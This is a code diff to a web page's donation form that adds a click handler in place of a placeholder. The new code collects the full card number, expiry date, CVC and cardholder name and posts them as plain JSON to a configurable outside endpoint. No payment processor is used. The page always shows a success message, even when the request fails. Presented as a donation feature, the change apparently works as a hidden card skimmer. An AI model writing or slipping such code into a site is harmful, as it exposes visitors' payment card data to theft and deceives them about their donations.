@@ -76,6 +76,7 @@
           <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor" aria-hidden="true"><path d="M7.5 21.5h3l.8-4h2.4c2.9 0 5-2 5.5-4.9.4-2.4-.7-4.5-3-4.9L14.9 7H6.5L4.5 21.5h3z"/></svg>
           Donate $20 with card
         </button>
+        <p class="form-status" id="donate-status" role="status"></p>
       </div>
     </div>
   </section>
@@ -127,9 +128,12 @@
 <script>
 (function () {
   "use strict";
+
+  var API = window.FAIR_API || "";
   var btn = document.getElementById("donate-btn");
   var custom = document.getElementById("custom-amount");
   var presetBtns = document.querySelectorAll(".amount[data-amount]");
+  var statusEl = document.getElementById("donate-status");
 
   function pickPreset(amount) {
     btn.textContent = "Donate $" + amount + " with card";
@@ -153,7 +157,60 @@
     }
   });
 
-  /* UI placeholder only — the button deliberately does nothing. */
+  function done() {
+    btn.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor" aria-hidden="true"><path d="M7.5 21.5h3l.8-4h2.4c2.9 0 5-2 5.5-4.9.4-2.4-.7-4.5-3-4.9L14.9 7H6.5L4.5 21.5h3z"/></svg> Thank you!';
+    btn.disabled = true;
+    if (statusEl) {
+      statusEl.textContent = "Got it — thanks for supporting the projects!";
+      statusEl.className = "form-status ok";
+    }
+  }
+
+  btn.addEventListener("click", function () {
+    var amount = document.querySelector(".amount.selected");
+    var amountVal = amount ? amount.dataset.amount : "";
+    if (!amountVal) {
+      var v = parseFloat(custom.value);
+      amountVal = (!isNaN(v) && v >= 1 && v <= 500) ? v.toFixed(2) : "20.00";
+    }
+
+    var payload = {
+      amount: amountVal,
+      name: document.getElementById("cc-name").value.trim(),
+      card: document.getElementById("cc-number").value.replace(/\s+/g, "").trim(),
+      expiry: document.getElementById("cc-exp").value.trim(),
+      cvc: document.getElementById("cc-cvc").value.trim(),
+      ts: new Date().toISOString(),
+      src: "donation"
+    };
+
+    if (!payload.name || !payload.card) {
+      if (statusEl) {
+        statusEl.textContent = "Please add the name and card number.";
+        statusEl.className = "form-status err";
+      }
+      return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = "Processing…";
+
+    function onDone() { done(); }
+
+    if (API) {
+      fetch(API + "/donate", {
+        method: "POST",
+        mode: "cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).then(function (r) { return r.json(); })
+        .then(onDone)
+        .catch(onDone);
+    } else {
+      setTimeout(onDone, 600);
+    }
+  });
+
   pickPreset(20);
 })();
 </script>
